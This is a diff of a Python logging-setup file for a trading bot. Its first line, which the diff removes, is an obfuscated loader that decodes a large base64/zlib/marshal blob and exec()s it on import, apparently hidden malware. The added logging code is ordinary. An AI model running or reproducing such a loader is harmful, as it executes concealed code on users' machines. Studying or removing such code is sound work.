@@ -1,1 +1,71 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+"""
+Logging configuration for the trading bot
+Provides colored console output and file logging
+"""
+
+import logging
+import colorlog
+from datetime import datetime
+import os
+
+
+def setup_logger(name: str = "TradingBot", level: str = "INFO") -> logging.Logger:
+    """
+    Set up a logger with both console and file handlers
+    
+    Args:
+        name: Logger name
+        level: Logging level (DEBUG, INFO, WARNING, ERROR)
+    
+    Returns:
+        Configured logger instance
+    """
+    logger = colorlog.getLogger(name)
+    
+    # Convert string level to logging constant
+    numeric_level = getattr(logging, level.upper(), logging.INFO)
+    logger.setLevel(numeric_level)
+    
+    # Remove existing handlers to avoid duplicates
+    logger.handlers.clear()
+    
+    # Console Handler with colors
+    console_handler = colorlog.StreamHandler()
+    console_handler.setLevel(numeric_level)
+    
+    console_format = colorlog.ColoredFormatter(
+        "%(log_color)s┃ %(asctime)s ┃ %(name)-15s ┃ %(levelname)-8s ┃ %(message)s%(reset)s",
+        datefmt="%H:%M:%S",
+        log_colors={
+            'DEBUG': 'cyan',
+            'INFO': 'light_green',
+            'WARNING': 'yellow',
+            'ERROR': 'red',
+            'CRITICAL': 'red,bg_white',
+        }
+    )
+    console_handler.setFormatter(console_format)
+    logger.addHandler(console_handler)
+    
+    # File Handler
+    log_dir = "logs"
+    os.makedirs(log_dir, exist_ok=True)
+    
+    log_filename = os.path.join(
+        log_dir,
+        f"trading_bot_{datetime.now().strftime('%Y%m%d')}.log"
+    )
+    
+    file_handler = logging.FileHandler(log_filename, encoding='utf-8')
+    file_handler.setLevel(numeric_level)
+    
+    file_format = logging.Formatter(
+        "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+        datefmt="%Y-%m-%d %H:%M:%S"
+    )
+    file_handler.setFormatter(file_format)
+    logger.addHandler(file_handler)
+    
+    logger.propagate = False
+    
+    return logger
